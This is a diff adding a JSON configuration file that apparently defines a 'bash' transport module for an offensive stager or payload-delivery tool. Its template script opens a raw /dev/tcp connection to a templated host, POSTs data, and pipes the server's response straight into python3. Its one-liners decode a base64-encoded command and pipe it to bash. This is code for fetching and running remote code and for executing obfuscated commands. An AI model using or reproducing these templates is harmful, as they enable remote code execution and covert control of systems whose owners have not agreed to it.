@@ -1,0 +1,31 @@
+{
+    "bash": {
+        "name": "bash",
+        "enabled": true,
+        "description": "Uses Bash's built-in /dev/tcp feature for HTTP connections",
+        "dependencies": ["bash"],
+        "detection": "command -v bash && bash -c '[ -w /dev/tcp ]'",
+        "http_template": [
+            "#!/bin/bash",
+            "exec 3<>/dev/tcp/{{HOST}}/{{PORT}}",
+            "echo -ne \"POST {{PATH}} HTTP/1.1\\r\\n\" >&3",
+            "echo -ne \"Host: {{HOST}}:{{PORT}}\\r\\n\" >&3",
+            "echo -ne \"Content-Type: application/x-www-form-urlencoded\\r\\n\" >&3",
+            "echo -ne \"Content-Length: {{CONTENT_LENGTH}}\\r\\n\" >&3",
+            "echo -ne \"Connection: close\\r\\n\\r\\n\" >&3",
+            "echo -ne \"{{DATA}}\" >&3",
+            "while IFS= read -r line; do",
+            "    line=$(echo \"$line\" | tr -d '\\r')",
+            "    [ -z \"$line\" ] && break",
+            "done <&3",
+            "cat <&3 | python3",
+            "exec 3>&-"
+        ],
+        "https_template": null,
+        "oneliners": [
+            "echo {{COMMAND_ENC}} | base64 -d | bash",
+            "base64 -d <<< {{COMMAND_ENC}} | bash",
+            "{{COMMAND_DEC}}"
+        ]
+    }
+}
